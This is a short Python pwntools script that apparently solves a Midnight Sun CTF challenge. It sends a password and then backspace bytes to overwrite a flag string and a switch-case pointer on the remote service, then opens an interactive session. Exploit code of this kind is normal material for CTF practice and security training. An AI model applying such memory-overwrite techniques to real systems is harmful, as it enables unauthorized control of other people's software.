from pwn import *
import time

r = remote('hfs-os-01.play.midnightsunctf.se', 31337)
# r = process(['./run', 'debug'])
# raw_input()
# r = process(['./run'])

time.sleep(0.1)
r.send('sojupwner')
time.sleep(0.1)
r.send('A')
time.sleep(0.1)
r.send('\x7f'*6 + 'LAG2') # overwrite FLAG1 to FLAG2
time.sleep(0.1)

ptr_delta = 0x039C-0x0393
for _ in range(ptr_delta):
	r.send('\x7f')
	time.sleep(0.01)
r.send('\x4f\x0d') # overwrite switch case pointer
time.sleep(0.1)
r.send('exit')

r.interactive()
